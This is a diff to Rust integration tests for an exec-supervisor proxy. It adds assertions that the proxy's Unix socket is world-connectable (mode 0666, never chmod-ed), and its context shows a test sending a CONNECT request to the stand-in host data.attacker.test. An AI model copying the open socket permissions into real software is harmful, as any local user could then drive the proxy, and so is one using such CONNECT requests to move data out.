@@ -13,6 +13,15 @@ fn binary() -> Command {
     Command::new(env!("CARGO_BIN_EXE_axocoatl-exec-supervisor"))
 }
 
+fn socket_mode(path: &std::path::Path) -> u32 {
+    use std::os::unix::fs::PermissionsExt;
+    std::fs::symlink_metadata(path)
+        .unwrap()
+        .permissions()
+        .mode()
+        & 0o777
+}
+
 fn wait_with_deadline(child: &mut std::process::Child, deadline: Duration) -> Option<i32> {
     let until = Instant::now() + deadline;
     while Instant::now() < until {
@@ -59,6 +68,8 @@ fn the_proxy_speaks_the_protocol_over_stdio_and_exits_when_stdin_closes() {
     stdin
         .write_all(&protocol::encode_daemon(&DaemonFrame::HelloAck { protocol: 1 }).unwrap())
         .unwrap();
+    // Every user can connect: the socket is created 0666, never chmod-ed.
+    assert_eq!(socket_mode(&socket), 0o666);
     let mut client = UnixStream::connect(&socket).unwrap();
     client
         .write_all(b"CONNECT data.attacker.test:443 HTTP/1.1\r\n\r\n")
@@ -212,6 +223,7 @@ fn the_bridge_serves_until_killed() {
             Err(error) => panic!("{error}"),
         }
     };
+    assert_eq!(socket_mode(&socket), 0o666);
     let (mut accepted, _) = app.accept().unwrap();
     stream.write_all(b"hello").unwrap();
     let mut received = [0u8; 5];
